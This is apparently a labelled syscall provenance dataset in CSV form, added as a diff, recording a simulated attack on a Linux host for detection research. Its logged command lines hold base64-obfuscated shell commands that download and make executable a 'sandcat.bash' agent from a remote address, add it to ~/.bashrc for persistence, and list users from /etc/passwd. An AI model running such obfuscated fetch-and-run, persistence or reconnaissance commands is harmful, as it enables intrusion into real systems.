@@ -1,0 +1,387 @@
+id,type,from,to,uid,egid,exe,gid,euid,name,pid,seen time,source,ppid,command line,start time,event id,time,operation,path,subtype,permissions,epoch,version,flags,local address,remote port,protocol,remote address,local port,tgid,fd,mode,label,subLabel,window
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156365.0,1701560822.319,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156367.0,1701560826.151,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156369.0,1701560829.979,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156371.0,1701560833.807,unlink,,,,,,,,,,,,,,,0,0,28359347
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,1cee3607b760fc5b7884c9d6c531dfbc,,,,,,,,,syscall,,,,156372.0,1701560835.111,rename (read),,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,8a06a88a53f772ae35a415397dd94722,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,156372.0,1701560835.111,rename (write),,,,,,,,,,,,,,,0,0,28359347
+,WasDerivedFrom,8a06a88a53f772ae35a415397dd94722,1cee3607b760fc5b7884c9d6c531dfbc,,,,,,,1950.0,,syscall,,,,156372.0,1701560835.111,rename,,,,,,,,,,,,,,,0,0,28359347
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f13ca6e847fab95e87ac04f272c1a25a,,,,,,,,,syscall,,,,156373.0,1701560835.111,rename (read),,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,8d162c4a73d8b3772c519a091ef75b24,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,156373.0,1701560835.111,rename (write),,,,,,,,,,,,,,,0,0,28359347
+,WasDerivedFrom,8d162c4a73d8b3772c519a091ef75b24,f13ca6e847fab95e87ac04f272c1a25a,,,,,,,1950.0,,syscall,,,,156373.0,1701560835.111,rename,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,7c34b3d6a293864acf74e08419b032c8,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,156374.0,1701560835.111,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,dfbf35e00fb82392d65db7829f3646f5,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156376.0,1701560837.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156390.0,1701560838.435,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,3f6ef075d99770e4d5ad8bc1915e10e6,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156392.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,3b831b0c23fe63c5a0a05d7260489d32,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156394.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,f75ec6ff0d673c0869e1e77ab58e17c8,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156396.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,e75e3a685d707b54eac60eaac2c5279a,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156398.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,a01fa649b6b1d735101cd761ea2104eb,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156400.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,0667aeb73c750f40cb5c86655af7317b,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156402.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,efe62eea2a04c4fc7b140f12e86441d3,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156404.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,ec7953aec97633bfbc4d89ea9ab23e10,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156406.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,ba32a1b1b02e24826fd0f9db7d0d03cc,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156408.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,049bbd4dcc15f0bde75471ba13ba37ac,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156410.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156413.0,1701560843.671,unlink,,,,,,,,,,,,,,,0,0,28359347
+30d5a9642fb10ae48d46d91539ae71b4,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,92385.0,1701560845.695,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,CandC,28359347
+642c1833761abb40f0d49fddb9bd6cd2,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,92385.0,,syscall,4127.0,"sh -c eval ""$(echo Y3VybCAtc08gaHR0cDovLzE3Mi4xNi42NS4xMjg6ODAwMC9zYW5kY2F0LmJhc2g7Y2htb2QgK3ggc2FuZGNhdC5iYXNo | base64 --decode)""",1701560845.695,,,,,,,,,,,,,,,,,,1,CandC,28359347
+,WasTriggeredBy,642c1833761abb40f0d49fddb9bd6cd2,30d5a9642fb10ae48d46d91539ae71b4,,,,,,,,,syscall,,,,156434.0,1701560845.695,execve,,,,,,,,,,,,,,,0,0,28359347
+,Used,642c1833761abb40f0d49fddb9bd6cd2,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,156434.0,1701560845.695,load,,,,,,,,,,,,,,,0,0,28359347
+,Used,642c1833761abb40f0d49fddb9bd6cd2,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,156434.0,1701560845.695,load,,,,,,,,,,,,,,,0,0,28359347
+2bca7ce7d7dbabe3e6ad063e16c69166,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,92388.0,1701560845.699,syscall,92386.0,,,,,,,,,,,,,,,,,,,,0,0,28359347
+75b5c127229aab552a09044b10c97483,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,92388.0,,syscall,92386.0,base64 --decode,1701560845.699,,,,,,,,,,,,,,,,,,0,0,28359347
+,WasTriggeredBy,75b5c127229aab552a09044b10c97483,2bca7ce7d7dbabe3e6ad063e16c69166,,,,,,,,,syscall,,,,156435.0,1701560845.699,execve,,,,,,,,,,,,,,,0,0,28359347
+,Used,75b5c127229aab552a09044b10c97483,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,156435.0,1701560845.699,load,,,,,,,,,,,,,,,0,0,28359347
+,Used,75b5c127229aab552a09044b10c97483,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,156435.0,1701560845.699,load,,,,,,,,,,,,,,,0,0,28359347
+d0a84b59d15413e4d1a32ab3f4071f47,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,92389.0,1701560845.703,syscall,92385.0,,,,,,,,,,,,,,,,,,,,1,CandC,28359347
+1d612dcfc45ee5e762b69935ef3a30cf,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,92389.0,,syscall,92385.0,curl -sO http://172.16.65.128:8000/sandcat.bash,1701560845.703,,,,,,,,,,,,,,,,,,1,CandC,28359347
+,WasTriggeredBy,1d612dcfc45ee5e762b69935ef3a30cf,d0a84b59d15413e4d1a32ab3f4071f47,,,,,,,,,syscall,,,,156436.0,1701560845.703,execve,,,,,,,,,,,,,,,0,0,28359347
+,Used,1d612dcfc45ee5e762b69935ef3a30cf,c1afc225f35b0d2bae0fded23b588232,,,,,,,,,syscall,,,,156436.0,1701560845.703,load,,,,,,,,,,,,,,,0,0,28359347
+,Used,1d612dcfc45ee5e762b69935ef3a30cf,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,156436.0,1701560845.703,load,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,75a090a9b8e649fe14ab5ca5ab765ac2,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156440.0,1701560846.907,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156442.0,1701560849.935,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156444.0,1701560853.76,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156446.0,1701560857.58,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156448.0,1701560861.388,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156450.0,1701560865.216,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156452.0,1701560869.044,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156454.0,1701560872.872,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156475.0,1701560878.84,unlink,,,,,,,,,,,,,,,0,0,28359347
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160187.0,1701563702.741,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160189.0,1701563706.557,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160192.0,1701563710.381,unlink,,,,,,,,,,,,,,,0,0,28359395
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,72a55a170468ec14a7ab40acb4bdeefd,,,,,,,,,syscall,,,,160193.0,1701563712.109,rename (read),,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,7de8ca17b123cc393a554c161a098f1a,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,160193.0,1701563712.109,rename (write),,,,,,,,,,,,,,,0,0,28359395
+,WasDerivedFrom,7de8ca17b123cc393a554c161a098f1a,72a55a170468ec14a7ab40acb4bdeefd,,,,,,,1950.0,,syscall,,,,160193.0,1701563712.109,rename,,,,,,,,,,,,,,,0,0,28359395
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,40824155bef903377160d8fc4dfe022f,,,,,,,,,syscall,,,,160194.0,1701563712.109,rename (read),,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,33fa4cbec9fbef8a95fb94977defdf01,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,160194.0,1701563712.109,rename (write),,,,,,,,,,,,,,,0,0,28359395
+,WasDerivedFrom,33fa4cbec9fbef8a95fb94977defdf01,40824155bef903377160d8fc4dfe022f,,,,,,,1950.0,,syscall,,,,160194.0,1701563712.109,rename,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,2dfc6bbe92fe300894affdc738e5e468,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,160195.0,1701563712.109,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160197.0,1701563715.945,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160199.0,1701563719.765,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160201.0,1701563723.594,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160222.0,1701563728.222,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160224.0,1701563732.046,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160226.0,1701563735.878,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160228.0,1701563739.706,unlink,,,,,,,,,,,,,,,0,0,28359395
+9617ddfd032aa854244d4c9fdc813ce2,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,94961.0,1701563741.834,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,CandC,28359395
+118b58c8ab372ad89f964aa7533381eb,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,94961.0,,syscall,4127.0,"sh -c eval ""$(echo ZWNobyB+L3NhbmRjYXQuYmFzaCA+PiB+Ly5iYXNocmM= | base64 --decode)""",1701563741.834,,,,,,,,,,,,,,,,,,1,CandC,28359395
+,WasTriggeredBy,118b58c8ab372ad89f964aa7533381eb,9617ddfd032aa854244d4c9fdc813ce2,,,,,,,,,syscall,,,,160230.0,1701563741.834,execve,,,,,,,,,,,,,,,0,0,28359395
+,Used,118b58c8ab372ad89f964aa7533381eb,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,160230.0,1701563741.834,load,,,,,,,,,,,,,,,0,0,28359395
+,Used,118b58c8ab372ad89f964aa7533381eb,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,160230.0,1701563741.834,load,,,,,,,,,,,,,,,0,0,28359395
+a61a3d9352e8a3a7d7dbef497f77a965,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,94964.0,1701563741.838,syscall,94962.0,,,,,,,,,,,,,,,,,,,,0,0,28359395
+ff7cb08aa3a2f15b793587f6afac4ee6,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,94964.0,,syscall,94962.0,base64 --decode,1701563741.838,,,,,,,,,,,,,,,,,,0,0,28359395
+,WasTriggeredBy,ff7cb08aa3a2f15b793587f6afac4ee6,a61a3d9352e8a3a7d7dbef497f77a965,,,,,,,,,syscall,,,,160231.0,1701563741.838,execve,,,,,,,,,,,,,,,0,0,28359395
+,Used,ff7cb08aa3a2f15b793587f6afac4ee6,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,160231.0,1701563741.838,load,,,,,,,,,,,,,,,0,0,28359395
+,Used,ff7cb08aa3a2f15b793587f6afac4ee6,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,160231.0,1701563741.838,load,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160233.0,1701563745.634,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160235.0,1701563749.454,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160237.0,1701563753.282,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,160258.0,1701563758.914,unlink,,,,,,,,,,,,,,,0,0,28359395
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165050.0,1701567363.647,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165052.0,1701567367.475,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165054.0,1701567371.295,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165056.0,1701567375.127,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165058.0,1701567378.943,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165060.0,1701567382.771,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165081.0,1701567389.016,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165083.0,1701567392.832,unlink,,,,,,,,,,,,,,,0,0,28359456
+d673ae9d2afc2d9ca187ca67c1ec08eb,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,98270.0,1701567393.892,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359456
+e2fe987d9bc778049349cdf79d7fa2be,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,98270.0,,syscall,4127.0,"sh -c eval ""$(echo Y3V0IC1kOiAtZjEgL2V0Yy9wYXNzd2QgfCBncmVwIC12ICdfJyB8IGdyZXAgLXYgJyMn | base64 --decode)""",1701567393.892,,,,,,,,,,,,,,,,,,1,discovery,28359456
+,WasTriggeredBy,e2fe987d9bc778049349cdf79d7fa2be,d673ae9d2afc2d9ca187ca67c1ec08eb,,,,,,,,,syscall,,,,165085.0,1701567393.892,execve,,,,,,,,,,,,,,,0,0,28359456
+,Used,e2fe987d9bc778049349cdf79d7fa2be,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,165085.0,1701567393.892,load,,,,,,,,,,,,,,,0,0,28359456
+,Used,e2fe987d9bc778049349cdf79d7fa2be,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165085.0,1701567393.892,load,,,,,,,,,,,,,,,0,0,28359456
+ab84f19403df983db5083966ecda72a2,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,98273.0,1701567393.896,syscall,98271.0,,,,,,,,,,,,,,,,,,,,0,0,28359456
+51e6f932724ab1c5d49a70a691b1b52c,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,98273.0,,syscall,98271.0,base64 --decode,1701567393.896,,,,,,,,,,,,,,,,,,0,0,28359456
+,WasTriggeredBy,51e6f932724ab1c5d49a70a691b1b52c,ab84f19403df983db5083966ecda72a2,,,,,,,,,syscall,,,,165086.0,1701567393.896,execve,,,,,,,,,,,,,,,0,0,28359456
+,Used,51e6f932724ab1c5d49a70a691b1b52c,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,165086.0,1701567393.896,load,,,,,,,,,,,,,,,0,0,28359456
+,Used,51e6f932724ab1c5d49a70a691b1b52c,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165086.0,1701567393.896,load,,,,,,,,,,,,,,,0,0,28359456
+88082b436a5072338b6adae779e5a603,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98275.0,1701567393.9,syscall,98270.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359456
+74e3fede0fc90b5d089b4e4c1a6c49c3,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98275.0,,syscall,98270.0,grep -v _,1701567393.9,,,,,,,,,,,,,,,,,,1,discovery,28359456
+,WasTriggeredBy,74e3fede0fc90b5d089b4e4c1a6c49c3,88082b436a5072338b6adae779e5a603,,,,,,,,,syscall,,,,165087.0,1701567393.9,execve,,,,,,,,,,,,,,,0,0,28359456
+,Used,74e3fede0fc90b5d089b4e4c1a6c49c3,63f3a986babf340d1d98ac82e4614aaa,,,,,,,,,syscall,,,,165087.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
+,Used,74e3fede0fc90b5d089b4e4c1a6c49c3,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165087.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
+13b8dae2a6330a48c029a4daeabe00c6,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98276.0,1701567393.9,syscall,98270.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359456
+8d39073a0b0b8f51514c6e677116ce15,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,98276.0,,syscall,98270.0,grep -v #,1701567393.9,,,,,,,,,,,,,,,,,,1,discovery,28359456
+,WasTriggeredBy,8d39073a0b0b8f51514c6e677116ce15,13b8dae2a6330a48c029a4daeabe00c6,,,,,,,,,syscall,,,,165088.0,1701567393.9,execve,,,,,,,,,,,,,,,0,0,28359456
+,Used,8d39073a0b0b8f51514c6e677116ce15,63f3a986babf340d1d98ac82e4614aaa,,,,,,,,,syscall,,,,165088.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
+,Used,8d39073a0b0b8f51514c6e677116ce15,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,165088.0,1701567393.9,load,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165091.0,1701567397.452,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165093.0,1701567401.092,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165095.0,1701567404.924,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165097.0,1701567408.752,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165099.0,1701567412.576,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,165120.0,1701567419.013,unlink,,,,,,,,,,,,,,,0,0,28359456
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,037831ca354ed2166773992583894b24,,,,,,,,,syscall,,,,165121.0,1701567419.105,rename (read),,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,d864858d3ccdc7d97b63a2577700ec02,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,165121.0,1701567419.105,rename (write),,,,,,,,,,,,,,,0,0,28359456
+,WasDerivedFrom,d864858d3ccdc7d97b63a2577700ec02,037831ca354ed2166773992583894b24,,,,,,,1950.0,,syscall,,,,165121.0,1701567419.105,rename,,,,,,,,,,,,,,,0,0,28359456
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,ade65d74d0facb9491a8f57f30980175,,,,,,,,,syscall,,,,165122.0,1701567419.105,rename (read),,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,5c384c7b04b8581f19a705e3da3d2cb6,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,165122.0,1701567419.105,rename (write),,,,,,,,,,,,,,,0,0,28359456
+,WasDerivedFrom,5c384c7b04b8581f19a705e3da3d2cb6,ade65d74d0facb9491a8f57f30980175,,,,,,,1950.0,,syscall,,,,165122.0,1701567419.105,rename,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,628182e1fc0417c9adfd5488908df1ac,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,165123.0,1701567419.109,unlink,,,,,,,,,,,,,,,0,0,28359456
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169845.0,1701570962.931,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169847.0,1701570966.754,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169849.0,1701570970.581,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169851.0,1701570974.413,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169853.0,1701570978.232,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169855.0,1701570982.068,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169876.0,1701570985.895,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169878.0,1701570989.102,unlink,,,,,,,,,,,,,,,0,0,28359516
+9eeff03ee29b0c6fdf4f242435824b2b,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,101566.0,1701570989.942,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359516
+12a0688cea225d1dfc9cd157f116ccea,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,101566.0,,syscall,4127.0,"sh -c eval ""$(echo aWZjb25maWc= | base64 --decode)""",1701570989.942,,,,,,,,,,,,,,,,,,1,discovery,28359516
+,WasTriggeredBy,12a0688cea225d1dfc9cd157f116ccea,9eeff03ee29b0c6fdf4f242435824b2b,,,,,,,,,syscall,,,,169880.0,1701570989.942,execve,,,,,,,,,,,,,,,0,0,28359516
+,Used,12a0688cea225d1dfc9cd157f116ccea,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,169880.0,1701570989.942,load,,,,,,,,,,,,,,,0,0,28359516
+,Used,12a0688cea225d1dfc9cd157f116ccea,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,169880.0,1701570989.942,load,,,,,,,,,,,,,,,0,0,28359516
